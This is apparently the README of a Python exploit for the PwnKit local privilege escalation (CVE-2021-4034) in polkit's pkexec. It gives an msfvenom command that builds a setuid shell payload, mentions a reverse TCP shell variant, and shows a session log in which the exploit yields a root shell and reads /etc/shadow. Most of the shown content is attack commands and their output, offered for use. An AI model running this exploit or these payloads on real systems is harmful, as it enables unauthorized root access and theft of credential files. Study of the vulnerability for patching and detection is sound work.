Python3 code to exploit
[CVE-2021-4034](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)
[(PWNKIT)](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt).
This was an exercise in "can I make this work in Python?", and not meant
as a robust exploit. It Works For Me, there are problaby bugs.

The default payload starts a shell as `root`, generated from `msfvenom`:

```
msfvenom -p linux/x64/exec -f elf-so PrependSetuid=true | base64
```

I've tested `linux/x64/shell_reverse_tcp` as well. Make sure you include
the `PrependSetuid=true` argument to `msfvenom`, otherwise you'll just get
a shell as the user and not root.

The code is cribbed from [blasty](https://twitter.com/bl4sty), the orginal is
available [here](https://haxx.in/files/blasty-vs-pkexec.c)

``` shell-session
$ python CVE-2021-4034.py
[+] Creating shared library for exploit code.
[+] Calling execve()
# id
uid=0(root) gid=1000(jra) groups=1000(jra),4(adm),27(sudo),119(lpadmin),998(lxd)
# whoami
root
# head /etc/shadow
root:*:18709:0:99999:7:::
daemon:*:18709:0:99999:7:::
bin:*:18709:0:99999:7:::
sys:*:18709:0:99999:7:::
sync:*:18709:0:99999:7:::
games:*:18709:0:99999:7:::
man:*:18709:0:99999:7:::
lp:*:18709:0:99999:7:::
mail:*:18709:0:99999:7:::
news:*:18709:0:99999:7:::
#
```

